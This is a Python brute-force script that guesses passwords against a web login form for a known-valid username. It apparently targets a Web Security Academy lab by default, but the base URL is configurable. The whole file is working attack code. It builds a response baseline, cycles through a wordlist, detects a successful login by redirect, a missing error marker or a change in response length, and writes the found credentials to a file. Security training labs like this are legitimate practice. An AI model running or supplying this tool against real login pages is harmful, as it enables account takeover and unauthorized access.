#!/usr/bin/env python3
"""
bruteforce_passwords.py
Brute-force password list for a known-valid username.

Default behaviour:
 - Reads wordlist from ./passwords.txt (one per line)
 - Uses default password probe '1' to learn baseline response
 - Marks success if:
    * HTTP redirect (301/302), OR
    * response does NOT contain the invalid-password marker (if found), OR
    * response length differs significantly from baseline (threshold configurable)

Usage examples:
  python3 bruteforce_passwords.py --user susanti
  python3 bruteforce_passwords.py -u susanti -w passwords.txt -b "https://target.tld" --marker "<p class=is-warning>Incorrect password</p>"
"""

import requests
import time
import argparse
from urllib.parse import urljoin

# --- defaults ---
DEFAULT_BASE = "https://0a7100c404b3967281df9dde00cc007c.web-security-academy.net"
LOGIN_PATH = "/login"
DEFAULT_WORDLIST = "passwords.txt"
OUTFILE = "found_passwords.txt"
PROBE_PASS = "1"            # initial probe password to build baseline
DELAY = 0.4                 # seconds between requests
LENGTH_THRESHOLD = 150      # difference in bytes from baseline to consider unusual

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}

INVALID_USERNAME_MARKER = '<p class=is-warning>Invalid username</p>'

def learn_baseline(session, url, username, probe_password, headers, invalid_username_marker, timeout=10):
    """
    Send one probe with probe_password to collect:
      - body text
      - status_code
      - presence of an 'invalid password' marker (if available)
    Returns: dict with keys: status, length, body, invalid_password_marker (str or None)
    """
    data = {"username": username, "password": probe_password}
    r = session.post(url, headers=headers, data=data, allow_redirects=True, timeout=timeout)
    body = r.text or ""
    status = r.status_code
    length = len(body)
    # Try to detect an 'invalid password' marker (we assume it's in same <p class=is-warning> tag but different text)
    # Attempt to find a p with is-warning that is NOT the 'Invalid username' text
    invalid_password_marker = None
    # If page contains a warning but not the invalid-username marker, assume that is invalid-password marker
    if "<p class=is-warning>" in body:
        # extract the full fragment(s) and decide
        # simple approach: find each occurrence and check text
        parts = []
        start = 0
        while True:
            idx = body.find("<p class=is-warning>", start)
            if idx == -1:
                break
            end_idx = body.find("</p>", idx)
            if end_idx == -1:
                break
            fragment = body[idx:end_idx+4]  # include </p>
            parts.append(fragment)
            start = end_idx + 4
        # choose a fragment that is not the invalid username marker
        for frag in parts:
            if invalid_username_marker not in frag:
                invalid_password_marker = frag.strip()
                break
    return {"status": status, "length": length, "body": body, "invalid_password_marker": invalid_password_marker}

def try_password(session, url, username, password, headers, timeout=10):
    data = {"username": username, "password": password}
    r = session.post(url, headers=headers, data=data, allow_redirects=True, timeout=timeout)
    return r

def main():
    p = argparse.ArgumentParser(description="Brute-force passwords for a known-valid username.")
    p.add_argument("--base", "-b", default=DEFAULT_BASE, help="Base URL (scheme + host).")
    p.add_argument("--path", default=LOGIN_PATH, help="Login path (default /login).")
    p.add_argument("--user", "-u", required=True, help="Known-valid username to test.")
    p.add_argument("--wordlist", "-w", default=DEFAULT_WORDLIST, help="Password list file (one per line).")
    p.add_argument("--out", "-o", default=OUTFILE, help="Output file for found password(s).")
    p.add_argument("--delay", "-d", type=float, default=DELAY, help="Delay between requests in seconds.")
    p.add_argument("--cookie", help="Optional session cookie value (format: name=value).")
    p.add_argument("--marker", help="If you already know the exact invalid-password marker HTML/substring, set it here.")
    p.add_argument("--threshold", type=int, default=LENGTH_THRESHOLD, help="Length-difference threshold to detect anomalies.")
    p.add_argument("--verbose", "-v", action="store_true", help="Verbose output.")
    args = p.parse_args()

    base = args.base.rstrip("/")
    url = urljoin(base + "/", args.path.lstrip("/"))
    headers = {**DEFAULT_HEADERS}
    headers["Origin"] = base
    headers["Referer"] = url

    s = requests.Session()
    if args.cookie:
        try:
            name, val = args.cookie.split("=", 1)
            s.cookies.set(name, val)
        except ValueError:
            print("[-] cookie format invalid (use name=value). Ignoring cookie.")

    try:
        with open(args.wordlist, "r", encoding="utf-8") as f:
            pwds = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[-] Password list not found: {args.wordlist}")
        return

    print(f"[+] Target: {url}")
    print(f"[+] Username: {args.user}")
    print(f"[+] Wordlist: {args.wordlist} ({len(pwds)} passwords)")
    print(f"[+] Delay: {args.delay}s\n")

    # learn baseline
    print("[*] Learning baseline with probe password...")
    baseline = learn_baseline(s, url, args.user, PROBE_PASS, headers, INVALID_USERNAME_MARKER)
    if args.verbose:
        print(f"    baseline status={baseline['status']} length={baseline['length']}")
        if baseline['invalid_password_marker']:
            print(f"    detected invalid-password fragment: {baseline['invalid_password_marker']}")
        else:
            print("    no explicit invalid-password fragment detected automatically.")

    invalid_marker = args.marker or baseline.get("invalid_password_marker")
    if invalid_marker:
        print(f"[*] Using invalid-password marker (substring) for detection:\n    {invalid_marker}\n")
    else:
        print("[*] No explicit invalid-password marker known â€” will use redirect/status and response-length heuristic.\n")

    found = []
    for i, pwd in enumerate(pwds, 1):
        try:
            r = try_password(s, url, args.user, pwd, headers)
        except requests.RequestException as e:
            print(f"[{i}/{len(pwds)}] {pwd} -> request error: {e}")
            time.sleep(1)
            continue

        body = r.text or ""
        status = r.status_code
        length = len(body)

        # detection logic
        success = False
        reason = None

        # 1) redirect -> usually success (or different flow)
        if status in (301, 302):
            success = True
            reason = f"redirect ({status})"
        # 2) explicit invalid marker known: if it is NOT present, it's suspicious (possible success)
        elif invalid_marker:
            if invalid_marker not in body:
                success = True
                reason = "invalid-password marker missing"
        else:
            # 3) check for 'Invalid username' which would be weird for known-valid user
            if INVALID_USERNAME_MARKER in body:
                print(f"[{i}/{len(pwds)}] {pwd} -> Unexpected: server reports invalid username (skipping)")
            else:
                # 4) length heuristic vs baseline
                if abs(length - baseline["length"]) > args.threshold:
                    success = True
                    reason = f"response length changed (baseline {baseline['length']} -> now {length})"

        if success:
            print(f"[{i}/{len(pwds)}] {pwd} -> POSSIBLE SUCCESS ({reason})")
            found.append((args.user, pwd, reason))
            with open(args.out, "a", encoding="utf-8") as fo:
                fo.write(f"{args.user}:{pwd}  # {reason}\n")
            # stop at first found (common), comment next line if you want to continue searching
            break
        else:
            if args.verbose:
                print(f"[{i}/{len(pwds)}] {pwd} -> bad (status {status}, len {length})")
            else:
                print(f"[{i}/{len(pwds)}] {pwd} -> -")
        time.sleep(args.delay)

    print("\n[+] Done.")
    if found:
        print(f"[+] Found {len(found)} candidate(s). Saved to {args.out}")
        for u, p, r in found:
            print(f"    {u}:{p}  ({r})")
    else:
        print("[+] No password found (try increasing threshold or use verbose mode to inspect responses).")

if __name__ == "__main__":
    main()
